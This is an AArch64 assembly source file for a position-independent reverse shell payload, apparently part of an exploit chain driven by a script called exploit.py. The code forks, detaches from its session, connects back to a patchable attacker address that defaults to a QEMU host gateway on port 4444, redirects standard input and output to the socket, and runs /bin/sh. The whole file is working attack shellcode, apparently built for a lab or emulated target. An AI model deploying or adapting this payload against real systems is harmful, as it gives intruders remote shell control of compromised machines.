/*
 * beachhead.S — AArch64 PIC reverse shell
 * Connects back to LHOST:LPORT (patched at runtime by exploit.py).
 *
 * The _sockaddr data block holds AF_INET, port (network byte order),
 * and IP (network byte order) as raw bytes so exploit.py can search
 * for the default values and overwrite them without recompiling.
 *
 * Syscalls (AArch64):
 *   clone   = 220
 *   setsid  = 157
 *   socket  = 198
 *   connect = 203
 *   dup3    = 24  (AArch64 has no dup2; dup3 with flags=0 is equivalent)
 *   execve  = 221
 *   exit    = 93
 */

.text
.global _start
_start:
    /* fork via clone(SIGCHLD, 0) */
    mov x8, #220
    mov x0, #17
    mov x1, #0
    mov x2, #0
    mov x3, #0
    mov x4, #0
    svc #0
    cbnz x0, _done

    /* setsid() — detach from MERIDIAN session */
    mov x8, #157
    svc #0

    /* allocate stack */
    sub sp, sp, #64

    /* socket(AF_INET=2, SOCK_STREAM=1, 0) */
    mov x8, #198
    mov x0, #2
    mov x1, #1
    mov x2, #0
    svc #0
    mov x19, x0

    /* sockaddr_in at sp+0 — loaded from patchable data block _sockaddr */
    adr x5, _sockaddr
    ldr w0, [x5]        /* bytes 0-3: AF_INET + port (network byte order) */
    str w0, [sp]
    ldr w0, [x5, #4]    /* bytes 4-7: IP address (network byte order) */
    str w0, [sp, #4]
    str xzr, [sp, #8]

    /* connect(sockfd, &sockaddr, 16) */
    mov x8, #203
    mov x0, x19
    mov x1, sp
    mov x2, #16
    svc #0

    /* dup3(sockfd, 0/1/2, 0) — no dup2 on AArch64; dup3 #24 with flags=0 */
    mov x8, #24
    mov x0, x19
    mov x1, #0
    mov x2, #0
    svc #0

    mov x8, #24
    mov x0, x19
    mov x1, #1
    mov x2, #0
    svc #0

    mov x8, #24
    mov x0, x19
    mov x1, #2
    mov x2, #0
    svc #0

    /* execve("/bin/sh", ["/bin/sh", "-s"], NULL) */
    adr x0, binsh
    adr x3, dashs
    str x0, [sp, #16]   // argv[0] = "/bin/sh"
    str x3, [sp, #24]   // argv[1] = "-s"
    str xzr, [sp, #32]  // argv[2] = NULL
    adr x0, binsh
    add x1, sp, #16
    mov x2, #0
    mov x8, #221
    svc #0

    /* fallback exit */
    mov x8, #93
    mov x0, #1
    svc #0

_done:
    ret

binsh: .asciz "/bin/sh"
dashs: .asciz "-s"
.align 2

/*
 * Patchable sockaddr_in data — exploit.py replaces these bytes at runtime.
 * Default: 10.0.2.2:4444 (QEMU host gateway).
 * Layout: [AF_INET 2B][port in network byte order 2B][IP in network byte order 4B]
 */
_sockaddr:
    .byte 0x02, 0x00        /* AF_INET */
    .byte 0x11, 0x5c        /* htons(4444) — LPORT */
    .byte 0x0a, 0x00, 0x02, 0x02  /* 10.0.2.2 — LHOST */